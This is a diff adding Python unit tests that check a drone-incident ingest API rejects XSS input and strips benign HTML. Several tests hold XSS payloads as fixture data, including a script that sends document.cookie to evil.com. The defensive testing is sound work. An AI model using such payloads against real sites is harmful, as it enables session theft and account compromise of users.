@@ -619,3 +619,539 @@ class TestIngestAPIHelpers:
         """Test parse_datetime returns None for None input"""
         result = parse_datetime(None)
         assert result is None
+
+
+class TestIngestAPITextValidation:
+    """Test input validation and sanitization for title and narrative fields"""
+
+    def test_title_with_xss_script_tag_returns_400(self):
+        """Test POST with XSS script tag in title returns 400"""
+        incident_data = {
+            "title": "<script>alert('XSS')</script>Drone spotted",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            h = handler()
+            h.__dict__.update(mock_request.__dict__)
+            h.do_POST()
+
+            assert mock_request.response_code == 400
+            assert "Title validation failed" in mock_request.error_message
+            assert "malicious" in mock_request.error_message.lower() or "script" in mock_request.error_message.lower()
+
+    def test_title_with_event_handler_returns_400(self):
+        """Test POST with event handler XSS in title returns 400"""
+        incident_data = {
+            "title": "Drone <img src=x onerror=alert('XSS')>spotted near airport",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            h = handler()
+            h.__dict__.update(mock_request.__dict__)
+            h.do_POST()
+
+            assert mock_request.response_code == 400
+            assert "Title validation failed" in mock_request.error_message
+
+    def test_title_with_javascript_uri_returns_400(self):
+        """Test POST with javascript: URI in title returns 400"""
+        incident_data = {
+            "title": "Click here: javascript:alert('XSS') for more info",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            h = handler()
+            h.__dict__.update(mock_request.__dict__)
+            h.do_POST()
+
+            assert mock_request.response_code == 400
+            assert "Title validation failed" in mock_request.error_message
+
+    def test_narrative_with_xss_script_tag_returns_400(self):
+        """Test POST with XSS script tag in narrative returns 400"""
+        incident_data = {
+            "title": "Valid drone sighting",
+            "narrative": "A drone was spotted <script>document.location='http://evil.com/steal?cookie='+document.cookie</script> near the airport.",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            h = handler()
+            h.__dict__.update(mock_request.__dict__)
+            h.do_POST()
+
+            assert mock_request.response_code == 400
+            assert "Narrative validation failed" in mock_request.error_message
+
+    def test_narrative_with_svg_xss_returns_400(self):
+        """Test POST with SVG-based XSS in narrative returns 400"""
+        incident_data = {
+            "title": "Valid drone sighting",
+            "narrative": "Incident report: <svg onload=alert('XSS')>image</svg> shows drone activity.",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            h = handler()
+            h.__dict__.update(mock_request.__dict__)
+            h.do_POST()
+
+            assert mock_request.response_code == 400
+            assert "Narrative validation failed" in mock_request.error_message
+
+    def test_narrative_with_data_uri_returns_400(self):
+        """Test POST with malicious data: URI in narrative returns 400"""
+        incident_data = {
+            "title": "Valid drone sighting",
+            "narrative": "See the evidence: data:text/html,<script>alert('XSS')</script>",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            h = handler()
+            h.__dict__.update(mock_request.__dict__)
+            h.do_POST()
+
+            assert mock_request.response_code == 400
+            assert "Narrative validation failed" in mock_request.error_message
+
+    def test_title_exceeding_length_limit_returns_400(self):
+        """Test POST with title exceeding 500 character limit returns 400"""
+        # Create a title with 600 characters (exceeds 500 limit)
+        long_title = "D" * 600
+
+        incident_data = {
+            "title": long_title,
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            h = handler()
+            h.__dict__.update(mock_request.__dict__)
+            h.do_POST()
+
+            assert mock_request.response_code == 400
+            assert "Title validation failed" in mock_request.error_message
+            assert "exceeds maximum length" in mock_request.error_message
+
+    def test_narrative_exceeding_length_limit_returns_400(self):
+        """Test POST with narrative exceeding 10000 character limit returns 400"""
+        # Create a narrative with 11000 characters (exceeds 10000 limit)
+        long_narrative = "A drone was spotted. " * 600  # ~12000 chars
+
+        incident_data = {
+            "title": "Valid drone sighting",
+            "narrative": long_narrative,
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            h = handler()
+            h.__dict__.update(mock_request.__dict__)
+            h.do_POST()
+
+            assert mock_request.response_code == 400
+            assert "Narrative validation failed" in mock_request.error_message
+            assert "exceeds maximum length" in mock_request.error_message
+
+    def test_benign_html_is_sanitized_successfully(self):
+        """Test POST with benign HTML tags sanitizes and stores clean content"""
+        incident_data = {
+            "title": "<b>Drone</b> spotted <i>near</i> <strong>airport</strong>",
+            "narrative": "The witness reported <em>seeing</em> a <u>small drone</u> at 3pm.",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560,
+            "sources": []
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            with patch('ingest.run_async') as mock_run_async:
+                # Capture what gets passed to insert_incident
+                captured_data = {}
+
+                def capture_and_return(coro):
+                    # The coro is insert_incident(incident_data) - we need to check incident_data
+                    captured_data['incident'] = incident_data
+                    return {"id": str(uuid4()), "status": "created"}
+
+                mock_run_async.side_effect = capture_and_return
+
+                h = handler()
+                h.__dict__.update(mock_request.__dict__)
+                h.do_POST()
+
+                # Should succeed (201 Created)
+                assert mock_request.response_code == 201
+
+                # Verify sanitized data was passed (HTML tags stripped)
+                assert captured_data.get('incident') is not None
+                # Title should have HTML stripped
+                assert '<b>' not in captured_data['incident']['title']
+                assert 'Drone spotted near airport' in captured_data['incident']['title']
+                # Narrative should have HTML stripped
+                assert '<em>' not in captured_data['incident']['narrative']
+                assert 'seeing' in captured_data['incident']['narrative']
+
+    def test_valid_text_content_preserved_after_sanitization(self):
+        """Test POST with valid text preserves content after sanitization"""
+        valid_title = "Drone spotted near Copenhagen Airport at 15:30"
+        valid_narrative = "A small commercial drone was observed hovering approximately 200 meters from the runway. The drone appeared to be a DJI model and was present for roughly 5 minutes before departing south-east."
+
+        incident_data = {
+            "title": valid_title,
+            "narrative": valid_narrative,
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560,
+            "sources": []
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            with patch('ingest.run_async') as mock_run_async:
+                captured_data = {}
+
+                def capture_and_return(coro):
+                    captured_data['incident'] = incident_data
+                    return {"id": str(uuid4()), "status": "created"}
+
+                mock_run_async.side_effect = capture_and_return
+
+                h = handler()
+                h.__dict__.update(mock_request.__dict__)
+                h.do_POST()
+
+                assert mock_request.response_code == 201
+                # Valid content should be preserved exactly (no stripping needed)
+                assert captured_data['incident']['title'] == valid_title
+                assert captured_data['incident']['narrative'] == valid_narrative
+
+    def test_unicode_text_preserved_after_sanitization(self):
+        """Test POST with unicode characters preserves content correctly"""
+        # Danish text with special characters
+        unicode_title = "Droneobservation ved København Lufthavn – alvorlig hændelse"
+        unicode_narrative = "En uidentificeret drone blev observeret kl. 15:30. Dronen fløj i højde på ~200 meter."
+
+        incident_data = {
+            "title": unicode_title,
+            "narrative": unicode_narrative,
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560,
+            "sources": []
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode('utf-8'),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            with patch('ingest.run_async') as mock_run_async:
+                captured_data = {}
+
+                def capture_and_return(coro):
+                    captured_data['incident'] = incident_data
+                    return {"id": str(uuid4()), "status": "created"}
+
+                mock_run_async.side_effect = capture_and_return
+
+                h = handler()
+                h.__dict__.update(mock_request.__dict__)
+                h.do_POST()
+
+                assert mock_request.response_code == 201
+                # Unicode should be preserved
+                assert "København" in captured_data['incident']['title']
+                assert "hændelse" in captured_data['incident']['title']
+                assert "høj" in captured_data['incident']['narrative']
+
+    def test_whitespace_normalized_in_title(self):
+        """Test POST with excessive whitespace gets normalized"""
+        messy_title = "  Drone   spotted    near    airport  "
+
+        incident_data = {
+            "title": messy_title,
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560,
+            "sources": []
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            with patch('ingest.run_async') as mock_run_async:
+                captured_data = {}
+
+                def capture_and_return(coro):
+                    captured_data['incident'] = incident_data
+                    return {"id": str(uuid4()), "status": "created"}
+
+                mock_run_async.side_effect = capture_and_return
+
+                h = handler()
+                h.__dict__.update(mock_request.__dict__)
+                h.do_POST()
+
+                assert mock_request.response_code == 201
+                # Whitespace should be normalized
+                sanitized_title = captured_data['incident']['title']
+                assert "   " not in sanitized_title  # No triple spaces
+                assert not sanitized_title.startswith(" ")  # No leading space
+                assert not sanitized_title.endswith(" ")  # No trailing space
+
+    def test_html_entities_decoded_in_narrative(self):
+        """Test POST with HTML entities gets them decoded properly"""
+        encoded_narrative = "Temperature was &gt; 30&deg;C &amp; humidity &lt; 50%"
+
+        incident_data = {
+            "title": "Weather observation during drone sighting",
+            "narrative": encoded_narrative,
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560,
+            "sources": []
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            with patch('ingest.run_async') as mock_run_async:
+                captured_data = {}
+
+                def capture_and_return(coro):
+                    captured_data['incident'] = incident_data
+                    return {"id": str(uuid4()), "status": "created"}
+
+                mock_run_async.side_effect = capture_and_return
+
+                h = handler()
+                h.__dict__.update(mock_request.__dict__)
+                h.do_POST()
+
+                assert mock_request.response_code == 201
+                # HTML entities should be decoded
+                decoded_narrative = captured_data['incident']['narrative']
+                assert ">" in decoded_narrative  # &gt; decoded
+                assert "&" in decoded_narrative  # &amp; decoded
+                assert "<" in decoded_narrative  # &lt; decoded
+
+    def test_encoded_xss_attack_detected(self):
+        """Test POST with URL-encoded XSS attack is detected and rejected"""
+        # URL-encoded <script>alert('XSS')</script>
+        encoded_xss = "Drone spotted %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E near airport"
+
+        incident_data = {
+            "title": encoded_xss,
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            h = handler()
+            h.__dict__.update(mock_request.__dict__)
+            h.do_POST()
+
+            assert mock_request.response_code == 400
+            assert "Title validation failed" in mock_request.error_message
+
+    def test_mixed_benign_html_and_content(self):
+        """Test POST with mixed benign HTML formats and cleans appropriately"""
+        incident_data = {
+            "title": "Important <strong>drone</strong> sighting",
+            "narrative": """<p>At approximately 15:30 local time, a drone was observed.</p>
+<ul>
+<li>Location: Near runway 3</li>
+<li>Duration: 5 minutes</li>
+</ul>
+<p>The airport security was notified immediately.</p>""",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560,
+            "sources": []
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            with patch('ingest.run_async') as mock_run_async:
+                captured_data = {}
+
+                def capture_and_return(coro):
+                    captured_data['incident'] = incident_data
+                    return {"id": str(uuid4()), "status": "created"}
+
+                mock_run_async.side_effect = capture_and_return
+
+                h = handler()
+                h.__dict__.update(mock_request.__dict__)
+                h.do_POST()
+
+                assert mock_request.response_code == 201
+                # Tags should be stripped but content preserved
+                assert '<p>' not in captured_data['incident']['narrative']
+                assert '<li>' not in captured_data['incident']['narrative']
+                assert 'runway 3' in captured_data['incident']['narrative']
+                assert 'Duration' in captured_data['incident']['narrative']
+
+    def test_empty_title_validation_passes(self):
+        """Test POST with empty title still requires title field"""
+        incident_data = {
+            "title": "",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560,
+            "sources": []
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            with patch('ingest.run_async') as mock_run_async:
+                mock_run_async.return_value = {"id": str(uuid4()), "status": "created"}
+
+                h = handler()
+                h.__dict__.update(mock_request.__dict__)
+                h.do_POST()
+
+                # Empty title is valid (validation passes for empty strings)
+                # The API will accept it since 'title' field is present
+                assert mock_request.response_code == 201
+
+    def test_null_narrative_validation_passes(self):
+        """Test POST without narrative field succeeds"""
+        incident_data = {
+            "title": "Valid drone sighting",
+            "occurred_at": "2024-10-14T12:00:00Z",
+            "lat": 55.6181,
+            "lon": 12.6560,
+            "sources": []
+        }
+
+        mock_request = MockHTTPRequestHandler(
+            method='POST',
+            body=json.dumps(incident_data).encode(),
+            headers={'Authorization': 'Bearer test-token'}
+        )
+
+        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-token'}):
+            with patch('ingest.run_async') as mock_run_async:
+                captured_data = {}
+
+                def capture_and_return(coro):
+                    captured_data['incident'] = incident_data
+                    return {"id": str(uuid4()), "status": "created"}
+
+                mock_run_async.side_effect = capture_and_return
+
+                h = handler()
+                h.__dict__.update(mock_request.__dict__)
+                h.do_POST()
+
+                assert mock_request.response_code == 201
+                # Narrative should be empty string after validation
+                assert captured_data['incident']['narrative'] == ''
